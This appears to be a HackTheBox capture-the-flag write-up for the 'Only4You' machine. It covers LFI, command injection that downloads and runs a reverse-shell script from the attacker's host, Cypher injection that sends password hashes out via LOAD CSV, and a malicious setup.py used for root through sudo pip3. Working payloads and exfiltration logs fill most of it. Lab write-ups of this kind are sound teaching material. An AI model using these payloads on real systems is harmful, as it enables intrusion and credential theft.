---
title:      "HackTheBox - Only4You"
subtitle:   "Write-Up"
date:       2023-08-26
author:     "D4mianwayne"
tags:    ["python-flask, LFI, chisel, jtr, pip3"]
categories: ["HackTheBox"]
layout: "post"
highlight: vs2015
---

Writeup for HackTheBox's Only4You machine.

<!-- more -->

`only4you.htb` seemed like a static site with the `contact` functionality where we had some input fields, directory busting did not reveal anything interestin:

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled.png)

Doing the `vhost` scan, we can see that `beta.only4you.htb` :

```r
❯ gobuster vhost -u http://only4you.htb/ -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://only4you.htb/
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/04/23 06:14:42 Starting gobuster in VHOST enumeration mode
===============================================================
Found: beta.only4you.htb (Status: 200) [Size: 2191]
                                                   
===============================================================
2023/04/23 06:18:25 Finished
===============================================================
```

It seems like an image conversion/resize website and it also allow us to download source code:

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_1.png)

Downloading the source and analyzing the `[app.py](http://app.py)` :

```r
❯ tree
.
├── beta
│   ├── app.py
│   ├── static
│   │   └── img
│   │       └── image-resize.svg
│   ├── templates
│   │   ├── 400.html
│   │   ├── 404.html
│   │   ├── 405.html
│   │   ├── 500.html
│   │   ├── convert.html
│   │   ├── index.html
│   │   ├── list.html
│   │   └── resize.html
│   ├── tool.py
│   └── uploads
│       ├── convert
│       ├── list
│       └── resize
└── source.zip
```

```python
from flask import Flask, request, send_file, render_template, flash, redirect, send_from_directory
import os, uuid, posixpath
from werkzeug.utils import secure_filename
from pathlib import Path
from tool import convertjp, convertpj, resizeimg

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex
app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024
app.config['RESIZE_FOLDER'] = 'uploads/resize'
app.config['CONVERT_FOLDER'] = 'uploads/convert'
app.config['LIST_FOLDER'] = 'uploads/list'
app.config['UPLOAD_EXTENSIONS'] = ['.jpg', '.png']

@app.route('/', methods=['GET'])
def main():
    return render_template('index.html')

@app.route('/resize', methods=['POST', 'GET'])
def resize():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('Something went wrong, Try again!', 'danger')
            return redirect(request.url)
        file = request.files['file']
        img = secure_filename(file.filename)
        if img != '':
            ext = os.path.splitext(img)[1]
            if ext not in app.config['UPLOAD_EXTENSIONS']:
                flash('Only png and jpg images are allowed!', 'danger')
                return redirect(request.url)    
            file.save(os.path.join(app.config['RESIZE_FOLDER'], img))
            status = resizeimg(img)
            if status == False:
                flash('Image is too small! Minimum size needs to be 700x700', 'danger')
                return redirect(request.url)
            else:
                flash('Image is succesfully uploaded!', 'success')
        else:
            flash('No image selected!', 'danger')
            return redirect(request.url)
        return render_template('resize.html', clicked="True"), {"Refresh": "5; url=/list"}
    else:
        return render_template('resize.html', clicked="False")

@app.route('/convert', methods=['POST', 'GET'])
def convert():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('Something went wrong, Try again!', 'danger')
            return redirect(request.url)
        file = request.files['file']
        img = secure_filename(file.filename)
        if img != '':
            ext = os.path.splitext(img)[1]
            if ext not in app.config['UPLOAD_EXTENSIONS']:
                flash('Only jpg and png images are allowed!', 'danger')
                return redirect(request.url)    
            file.save(os.path.join(app.config['CONVERT_FOLDER'], img))
            if ext == '.png':
                image = convertpj(img)
                return send_from_directory(app.config['CONVERT_FOLDER'], image, as_attachment=True)
            else:
                image = convertjp(img)
                return send_from_directory(app.config['CONVERT_FOLDER'], image, as_attachment=True)
        else:
            flash('No image selected!', 'danger')
            return redirect(request.url) 
        return render_template('convert.html')
    else:
        [f.unlink() for f in Path(app.config['CONVERT_FOLDER']).glob("*") if f.is_file()]
        return render_template('convert.html')

@app.route('/source')
def send_report():
    return send_from_directory('static', 'source.zip', as_attachment=True)

@app.route('/list', methods=['GET'])
def list():
    return render_template('list.html')

@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_error(error):
    return render_template('500.html'), 500

@app.errorhandler(400)
def bad_request(error):
    return render_template('400.html'), 400

@app.errorhandler(405)
def method_not_allowed(error):
    return render_template('405.html'), 405

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False)
```

We see that it has a download endpoint where it checks basic things for LFI like `../` characters and also checks if the given path is not absolute, check from the application’s upload directory but if the given path is absolute, then proceed to provide the file in the response. This can be taken into our advantage as we can specify the absolute path of any arbitrary file on the system and retrieve the contents of it, from example giving `../../../../.../../etc/paswd` will result in failure as it won’t pass the filter check but giving `/etc/passwd` which is the absolute path, the application will return the file contents.

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_2.png)

From the further investigation, nothing interesting was found, since we know that there is the main website running, I checked the `error.log` for the `nginx` and it showed the directory path for the main site:

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_3.png)

I grabbed that `[app.py](http://app.py)` from the `only4you.htb` directory from the `/var/www/`

```python
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_errorerror(error):
    return render_template('500.html'), 500

@app.errorhandler(400)
def bad_request(error):
    return render_template('400.html'), 400

@app.errorhandler(405)
def method_not_allowed(error):
    return render_template('405.html'), 405

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False)
```

From the first glance the code had nothing interesting accept `form` module which was being imported, checking the `[form.py](http://form.py)` :

```python
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
		if "v=spf1" not in output:
			return 1
		else:
			domains = []
			ips = []
			if "include:" in output:
				dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
				dms.pop(0)
				for domain in dms:
					domains.append(domain)
				while True:
					for domain in domains:
						result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
						output = result.stdout.decode('utf-8')
						if "include:" in output:
							dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
							domains.clear()
							for domain in dms:
								domains.append(domain)
						elif "ip4:" in output:
							ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
							ipaddresses.pop(0)
							for i in ipaddresses:
								ips.append(i)
						else:
							pass
					break
			elif "ip4" in output:
				ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
				ipaddresses.pop(0)
				for i in ipaddresses:
					ips.append(i)
			else:
				return 1
		for i in ips:
			if ip == i:
				return 2
			elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
				return 2
			else:
				return 1

def sendmessage(email, subject, message, ip):
	status = issecure(email, ip)
	if status == 2:
		msg = EmailMessage()
		msg['From'] = f'{email}'
		msg['To'] = 'info@only4you.htb'
		msg['Subject'] = f'{subject}'
		msg['Message'] = f'{message}'

		smtp = smtplib.SMTP(host='localhost', port=25)
		smtp.send_message(msg)
		smtp.quit()
		return status
	elif status == 1:
		return status
	else:
		return status
```

This script performs the pattern to check for the email address then split it in two half and check the address of the domain by calling `dig` via `[subprocess.run](http://subprocess.run)` 

```python
#!/usr/bin/python3

from subprocess import run,PIPE
import re

email = "hello@gmail.com;id"
if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
	print("Nope, try again")
else:
	domain = email.split("@", 1)[1]
	result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
	output = result.stdout.decode('utf-8')
	print(output)
```

Though the `regex` was used to check if the `pattern` matches the email then the second half was passed to the `dig` command, what we can do here is provide a valid mail and after that add a semicolon in the address, since `re.match` is used, once the pattern will be found it will return `True`

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_4.png)

As we can see that `;id` was given at the end of the mail address and is executed. Next, we can try the same payload on the website, here we can just provide the `wget` command to confirm if it is working and it made the connection to local HTTP Server:

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_5.png)

```python
❯ sudo python3 -m http.server 80 --bind 10.10.14.22
[sudo] password for kali: 
Serving HTTP on 10.10.14.22 port 80 (http://10.10.14.22:80/) ...
10.10.11.210 - - [23/Apr/2023 07:25:03] "GET / HTTP/1.1" 200 -
```

Now, we just download the `[shel.sh](http://shel.sh)` file containing the reverse shell payload and then executing it with the next request with `bash /tmp/shell.sh`

```python
name=robin&email=robin%40only4you%2Ehtb%3Bwget%20http%3A%2F%2F10%2E10%2E14%2E22%2Fshell%2Esh%20%2DO%20%2Ftmp%2Fshell%2Esh&subject=nothing&message=al
name=robin&email=robin%40only4you%2Ehtb%3Bbash%20%2Ftmp%2Fshell%2Esh&subject=nothing&message=al
```

Doing so, we got the connection on the listener:

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_6.png)

After doing initial enumeration, I noticed there were two users named `john` and `dev` and in the `/opt` folder, we see that there were two folders `gogs` and `internal_app` but we did not have permissions to check the folder, moving on, I saw that there were two ports in use `3000` and `8001`

```python
bash-5.0$ netstat -ntpl
netstat -ntpl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1034/nginx: worker  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
bash-5.0$ cd /tmp
```

Since we do not have the SSH connection, I used the `chisel` to perform port forwarding:

```python
bash-5.0$ ./chisel client 10.10.14.22:9999 R:8001:127.0.0.1:8001 R:3000:127.0.0.1:3000
<22:9999 R:8001:127.0.0.1:8001 R:3000:127.0.0.1:3000
2023/04/23 07:40:38 client: Connecting to ws://10.10.14.22:9999
2023/04/23 07:40:39 client: Connected (Latency 112.100734ms)
```

Checking the port `3000` , it was running `gogs` and we did not have any credentials to check here:

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_7.png)

Moving on to the port `8001` , it also had a login page:

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_8.png)

Trying with the following credentials resulted in the application access:

```python
admin:admin
```

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_9.png)

The application had a task marked as completed that the transfer to `neo4j` database has been completed:

We also had a “Employee” page which allowed us to search for employees:

Giving a single quote in the search box resulted in `500` error:

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_10.png)

Given, we already know that the backend database is `neo4j` , just a note that it differs from the SQL queries, `neo4j` uses Cypher Queries and for the Cypher queries one thing to note down is that every query must return some sort of the value. To check and confirm the hypothesis of the injection, there is a procedure named as `LOAD CSV FROM` which can be used to load arbitrary values from a remote server over HTTP connection. Here, we just tried to check if it makes the connection to our remote HTTP server:

```python
' OR 1=1 LOAD CSV FROM 'http://10.10.14.22' AS y RETURN ''//
```

Injecting the above query and checking the HTTP Server, we see that there were some requests made to it from `10.10.11.210` 

```python
❯ sudo python3 -m http.server 80 --bind 10.10.14.22
Serving HTTP on 10.10.14.22 port 80 (http://10.10.14.22:80/) ...
10.10.11.210 - - [23/Apr/2023 11:10:29] "GET / HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 11:10:29] "GET / HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 11:10:30] "GET / HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 11:10:30] "GET / HTTP/1.1" 200 -
```

Next thing to try here is to extract `labels`  which is equivalent for SQL’s tables:

```python
' MATCH (n) WITH 1337 AS x CALL db.labels() YIELD label AS d LOAD CSV FROM 'http://10.10.14.22/'+d AS y RETURN y //
```

And on our HTTP server, we see that a request to `user` endpoint was made which means there is a label called `user` 

```python
10.10.11.210 - - [23/Apr/2023 11:22:03] "GET /user HTTP/1.1" 404
```

Now that we know the `label` , we can get the data from the `label`:

```python
' OR 1=1 WITH 1 as a MATCH (f:User) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.22/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

Injecting the payload resulted in several connections to our HTTP server revealing the hashes and usernames:

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_11.png)

```python
❯ sudo python3 -m http.server 80 --bind 10.10.14.22
Serving HTTP on 10.10.14.22 port 80 (http://10.10.14.22:80/) ...
10.10.11.210 - - [23/Apr/2023 16:28:44] "GET /shell.sh HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 16:33:04] code 404, message File not found
10.10.11.210 - - [23/Apr/2023 16:33:04] "GET /user HTTP/1.1" 404 -
10.10.11.210 - - [23/Apr/2023 16:54:50] code 404, message File not found
10.10.11.210 - - [23/Apr/2023 16:54:50] "GET /neo4j HTTP/1.1" 404 -
10.10.11.210 - - [23/Apr/2023 16:56:57] code 400, message Bad request syntax ('GET /Neo4j Kernel HTTP/1.1')
10.10.11.210 - - [23/Apr/2023 16:56:57] "GET /Neo4j Kernel HTTP/1.1" 400 -
10.10.11.210 - - [23/Apr/2023 17:06:45] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:45] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:45] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:45] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:46] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:46] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:46] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:46] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:46] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:46] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:47] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:47] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:47] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:47] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:47] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:47] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:48] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:48] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:48] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [23/Apr/2023 17:06:48] "GET /?username=john HTTP/1.1" 200 -
```

Cracking the `hashes` on the crackstation, we see that there is a hash which equals to `ThisIs4You` and that has belonged to `john` user:

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_12.png)

```python
john:ThisIs4You
```

Now, we can login to the SSH via the obtained credentials:

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_13.png)

Once logged in and checking if there is any command that could be ran by `john` user:

```python
john@only4you:~$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

Now, searching for any privilege escalation online for the `pip download`, I stumbled on the following post:

[https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/)

Following the post, I just changed the `[setup.py](http://setup.py)` and used `os.system` to execute the same shell script that I had downloaded previously to the machine:

```python
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def RunCommand():
    print("Hello, p0wnd!")
    os.system("bash /tmp/shell.sh")

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)

class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "this_is_fine_wuzzi",
    version = "0.0.1",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
```

Now, we can just upload the `tar.gz` file to a repository on`gogs` using `john` credentials and then execute the command:

- Note that in order to run the `sudo pip download` , it only accepted a `tar.gz` file downloaded from the port `3000` of the localhost, so we needed to upload the `tar.gz` file to the `gogs`

```python
john@only4you:/var/tmp/tested_repo$ cp ../this_is_fine_wuzzi-0.0.1.tar.gz xploited.tar.gz
john@only4you:/var/tmp/tested_repo$ git add .
john@only4you:/var/tmp/tested_repo$ git commit -m "exp"
[master 675d20a] exp
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 xploited.tar.gz
john@only4you:/var/tmp/tested_repo$ git push
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 2 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 2.94 KiB | 2.94 MiB/s, done.
Total 3 (delta 0), reused 0 (delta 0)
Username for 'http://127.0.0.1:3000': john
Password for 'http://john@127.0.0.1:3000': 
To http://127.0.0.1:3000/john/tested_repo.git
   947c79a..675d20a  master -> master
```

I uploaded the `tar.gz` via `git` command as the web application for the `gogs` was too buggy over the tunneling, then executing the command, resulted in `root` :

![](/img/OnlyForYou_6cf32928838a4b23bc4a47a1102c4daf/Untitled_14.png)


